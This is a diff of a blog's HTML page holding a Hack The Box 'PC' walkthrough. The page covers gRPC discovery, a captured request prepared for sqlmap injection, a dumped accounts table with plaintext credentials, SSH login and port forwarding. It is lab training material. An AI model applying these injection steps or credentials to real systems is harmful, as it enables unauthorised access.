@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='htb pc writeup category: web
 difficulty: easy
 Hello, and welcome to another walkthrough of a htb machine.
 When you run a port scan on the target we get port 22 open , a full port scan reveals port 50015 that nmap cannot tell the service which it is running
-1 2 open port 22 open port 50015 a little reserarch i found out that the service is grpc &amp;raquo; for more datails of what it is here'>
+1 2 3  open port 22 open port 50015   a little reserarch i found out that the service is grpc &amp;raquo; for more datails of what it is here'>
 <title>HTB PC</title>
 
 <link rel='canonical' href='https://f0rk3b0mb.github.io/p/htb-pc/'>
@@ -15,7 +15,7 @@ When you run a port scan on the target we get port 22 open , a full port scan re
 difficulty: easy
 Hello, and welcome to another walkthrough of a htb machine.
 When you run a port scan on the target we get port 22 open , a full port scan reveals port 50015 that nmap cannot tell the service which it is running
-1 2 open port 22 open port 50015 a little reserarch i found out that the service is grpc &amp;raquo; for more datails of what it is here'>
+1 2 3  open port 22 open port 50015   a little reserarch i found out that the service is grpc &amp;raquo; for more datails of what it is here'>
 <meta property='og:url' content='https://f0rk3b0mb.github.io/p/htb-pc/'>
 <meta property='og:site_name' content='f0rk3b0mb'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-06-09T17:22:15&#43;03:00'/><meta property='article:modified_time' content='2023-06-09T17:22:15&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/htb.svg' />
@@ -25,7 +25,7 @@ When you run a port scan on the target we get port 22 open , a full port scan re
 difficulty: easy
 Hello, and welcome to another walkthrough of a htb machine.
 When you run a port scan on the target we get port 22 open , a full port scan reveals port 50015 that nmap cannot tell the service which it is running
-1 2 open port 22 open port 50015 a little reserarch i found out that the service is grpc &amp;raquo; for more datails of what it is here"><meta name="twitter:card" content="summary_large_image">
+1 2 3  open port 22 open port 50015   a little reserarch i found out that the service is grpc &amp;raquo; for more datails of what it is here"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/htb.svg' />
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
 <script>
@@ -442,11 +442,13 @@ if (!doNotTrack) {
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">open port 22
-</span></span><span class="line"><span class="cl">open port 50015
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">open port 22
+open port 50015
+
+</code></pre></td></tr></table>
 </div>
 </div><p>a little reserarch  i found out that the service is grpc  &raquo; for more datails of what it is <a class="link" href="https://grpc.io/"  target="_blank" rel="noopener"
     >here</a></p>
@@ -480,10 +482,12 @@ if (!doNotTrack) {
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;message&#34;: &#34;Unexpected \u003cclass &#39;TypeError&#39;\u003e: bad argument type for built-in operation&#34;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&#34;message&#34;: &#34;Unexpected \u003cclass &#39;TypeError&#39;\u003e: bad argument type for built-in operation&#34;
+
+</code></pre></td></tr></table>
 </div>
 </div><p>I saved the request in a file and fired up sqlmap</p>
 <div class="highlight"><div class="chroma">
@@ -508,29 +512,31 @@ if (!doNotTrack) {
 </span><span class="lnt">18
 </span><span class="lnt">19
 </span><span class="lnt">20
+</span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">POST /invoke/SimpleApp.getInfo HTTP/1.1
-</span></span><span class="line"><span class="cl">Host: 127.0.0.1:41553
-</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
-</span></span><span class="line"><span class="cl">Accept: */*
-</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
-</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
-</span></span><span class="line"><span class="cl">Content-Type: application/json
-</span></span><span class="line"><span class="cl">x-grpcui-csrf-token: ceu1ZeLii2J61yGbIh69ZsqYUUhVJ9vURydGc1b27KY
-</span></span><span class="line"><span class="cl">X-Requested-With: XMLHttpRequest
-</span></span><span class="line"><span class="cl">Content-Length: 190
-</span></span><span class="line"><span class="cl">Origin: http://127.0.0.1:41553
-</span></span><span class="line"><span class="cl">Connection: close
-</span></span><span class="line"><span class="cl">Referer: http://127.0.0.1:41553/
-</span></span><span class="line"><span class="cl">Cookie: wp-settings-1=libraryContent%3Dbrowse; _grpcui_csrf_token=ceu1ZeLii2J61yGbIh69ZsqYUUhVJ9vURydGc1b27KY
-</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
-</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
-</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">{&#34;metadata&#34;:[{&#34;name&#34;:&#34;token&#34;,&#34;value&#34;:&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NjMyMTkzMX0.L624cRHm_TXyUSDTBU14H82b2DNq44JacxN9XfT1cKU&#34;}],&#34;data&#34;:[{&#34;id&#34;:&#34;1*&#34;}]}
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">
+POST /invoke/SimpleApp.getInfo HTTP/1.1
+Host: 127.0.0.1:41553
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+x-grpcui-csrf-token: ceu1ZeLii2J61yGbIh69ZsqYUUhVJ9vURydGc1b27KY
+X-Requested-With: XMLHttpRequest
+Content-Length: 190
+Origin: http://127.0.0.1:41553
+Connection: close
+Referer: http://127.0.0.1:41553/
+Cookie: wp-settings-1=libraryContent%3Dbrowse; _grpcui_csrf_token=ceu1ZeLii2J61yGbIh69ZsqYUUhVJ9vURydGc1b27KY
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+{&#34;metadata&#34;:[{&#34;name&#34;:&#34;token&#34;,&#34;value&#34;:&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NjMyMTkzMX0.L624cRHm_TXyUSDTBU14H82b2DNq44JacxN9XfT1cKU&#34;}],&#34;data&#34;:[{&#34;id&#34;:&#34;1*&#34;}]}
+
+</code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/grpc/Screenshot%20from%202023-06-09%2015-19-08.png"
 	
@@ -561,20 +567,20 @@ if (!doNotTrack) {
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+----------+
-</span></span><span class="line"><span class="cl">| accounts |
-</span></span><span class="line"><span class="cl">| messages |
-</span></span><span class="line"><span class="cl">+----------+
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">+------------------------+----------+
-</span></span><span class="line"><span class="cl">| password               | username |
-</span></span><span class="line"><span class="cl">+------------------------+----------+
-</span></span><span class="line"><span class="cl">| admin                  | admin    |
-</span></span><span class="line"><span class="cl">| HereIsYourPassWord1431 | sau      |
-</span></span><span class="line"><span class="cl">+------------------------+----------+
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">+----------+
+| accounts |
+| messages |
++----------+
+
+
+
++------------------------+----------+
+| password               | username |
++------------------------+----------+
+| admin                  | admin    |
+| HereIsYourPassWord1431 | sau      |
++------------------------+----------+
+</code></pre></td></tr></table>
 </div>
 </div><p>We can login to ssh as the user sau. The we read user.txt</p>
 <p><img src="/images/grpc/Screenshot%20from%202023-06-09%2016-28-43.png"
@@ -596,14 +602,16 @@ if (!doNotTrack) {
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
+</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Here is the command
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">ssh -L 8000:localhost:8000 sau@10.10.11.214
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">It will map port 8000 on the server to port 8000 locally
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Here is the command
+
+ssh -L 8000:localhost:8000 sau@10.10.11.214
+
+It will map port 8000 on the server to port 8000 locally
+
+</code></pre></td></tr></table>
 </div>
 </div><p>Visiting the url we find out it is a login page of <a class="link" href="https://pyload.net/"  target="_blank" rel="noopener"
     >pyload</a>.
